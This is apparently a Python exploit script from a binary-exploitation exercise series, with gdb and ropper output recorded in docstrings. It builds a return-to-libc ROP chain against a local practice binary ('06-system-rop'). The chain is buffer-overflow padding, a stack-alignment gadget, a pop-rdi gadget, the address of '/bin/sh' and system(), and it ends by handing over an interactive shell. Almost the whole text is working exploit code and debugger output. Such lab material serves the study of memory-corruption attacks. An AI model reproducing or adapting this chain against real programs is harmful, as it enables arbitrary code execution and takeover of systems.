#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x4005b7: file src/06-system-rop.c, line 5.
(gdb) c
Continuing.
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...
Reading /lib/x86_64-linux-gnu/libc-2.27.so from remote target...
Reading /lib/x86_64-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/06-system-rop.c:5
5	int vulnerable() {
(gdb) i r $rsp
rsp            0x7fffffffddf8	0x7fffffffddf8
(gdb) p &buffer[0]
$1 = 0x7fffffffdd70 "\377\377\377\377"
(gdb) info proc mappings
process 14019
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
...
"""

"""
$ ropper --nocolor --file /lib/x86_64-linux-gnu/libc-2.27.so
0x000000000002155f: pop rdi; ret;
"""

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = './bin/x86-64/06-system-rop'
libc_path = '/lib/x86_64-linux-gnu/libc-2.27.so'

vulnerable_ret_addr = 0x7fffffffddf8
buffer_addr = 0x7fffffffdd70
libc_addr = 0x7ffff79e4000

pop_rdi_ret_addr = libc_addr + 0x000000000002155f

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

retq_asm = asm('retq')
retq_addr = libc_addr + libc.search(retq_asm).next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p64(retq_addr) # align stack
payload += p64(pop_rdi_ret_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
